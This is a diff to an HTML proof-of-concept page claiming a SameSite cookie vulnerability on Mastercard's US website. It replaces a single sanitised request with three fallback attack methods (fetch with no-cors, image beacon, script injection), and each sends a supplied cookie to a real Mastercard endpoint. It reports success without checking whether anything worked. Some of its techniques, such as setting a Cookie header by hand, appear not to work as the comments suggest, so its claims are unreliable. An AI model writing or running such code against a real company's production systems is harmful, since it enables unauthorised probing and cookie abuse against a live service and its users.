@@ -100,7 +100,7 @@
     </style>
 </head>
 <body>
-    <div class="version">v1.3.1</div>
+    <div class="version">v1.4.0</div>
     <div class="container">
         <h1>Mastercard SameSite Cookie Vulnerability PoC</h1>
         
@@ -274,36 +274,79 @@
             
             logResult('Starting exploit...');
             
-            // Create payload with sanitized data
-            const sanitizedPayload = JSON.stringify({
-                "sensor_data": "3;0;1;0;3228216;sanitized_payload"
-            });
+            // Alternative exploit methods
+            const exploitMethods = [
+                () => fetchExploit(cookieToUse),
+                () => imageExploit(cookieToUse),
+                () => scriptExploit(cookieToUse)
+            ];
             
-            // Create a fetch request to the bot manager endpoint
-            fetch('https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0', {
-                method: 'POST',
-                credentials: 'include', // This includes cookies
-                headers: {
-                    'Content-Type': 'application/json;charset=UTF-8',
-                    'Origin': 'https://www.mastercard.us',
-                    'Referer': 'https://www.mastercard.us/en-us.html',
-                    'Cookie': cookieToUse
-                },
-                body: sanitizedPayload
-            })
-            .then(response => {
-                logResult(`Response status: ${response.status}`);
-                return response.text();
-            })
-            .then(data => {
-                logResult(`Response data: ${data}`);
-                logResult('<span class="success">✓ Exploit potentially successful!</span>');
-            })
-            .catch(error => {
-                logResult(`Request failed: ${error}`, true);
-                logResult('<strong>IMPORTANT:</strong> Error does not necessarily invalidate cookie transmission.');
-                logResult('Check browser\'s Network tab for detailed request information.');
-            });
+            // Try each exploit method
+            function tryNextExploit(index = 0) {
+                if (index >= exploitMethods.length) {
+                    logResult('<strong>ERROR:</strong> All exploit methods failed.', true);
+                    return;
+                }
+                
+                exploitMethods[index]()
+                    .catch(error => {
+                        logResult(`Exploit method ${index + 1} failed: ${error}`, true);
+                        tryNextExploit(index + 1);
+                    });
+            }
+            
+            // Fetch-based exploit
+            function fetchExploit(cookie) {
+                return fetch('https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0', {
+                    method: 'POST',
+                    mode: 'no-cors', // Bypass CORS
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Cookie': cookie
+                    },
+                    body: JSON.stringify({
+                        "sensor_data": "exploit_payload"
+                    })
+                }).then(response => {
+                    logResult('<span class="success">✓ Fetch Exploit Potentially Successful!</span>');
+                    return response;
+                });
+            }
+            
+            // Image-based exploit
+            function imageExploit(cookie) {
+                return new Promise((resolve, reject) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        logResult('<span class="success">✓ Image Exploit Potentially Successful!</span>');
+                        resolve();
+                    };
+                    img.onerror = (error) => {
+                        reject(error);
+                    };
+                    img.src = `https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0?cookie=${encodeURIComponent(cookie)}&t=${Date.now()}`;
+                });
+            }
+            
+            // Script-based exploit
+            function scriptExploit(cookie) {
+                return new Promise((resolve, reject) => {
+                    const script = document.createElement('script');
+                    script.src = `https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0?cookie=${encodeURIComponent(cookie)}&t=${Date.now()}`;
+                    script.onload = () => {
+                        logResult('<span class="success">✓ Script Exploit Potentially Successful!</span>');
+                        resolve();
+                    };
+                    script.onerror = (error) => {
+                        reject(error);
+                    };
+                    document.body.appendChild(script);
+                });
+            }
+            
+            // Start the exploit chain
+            tryNextExploit();
         }
         
         // Initialize event listeners
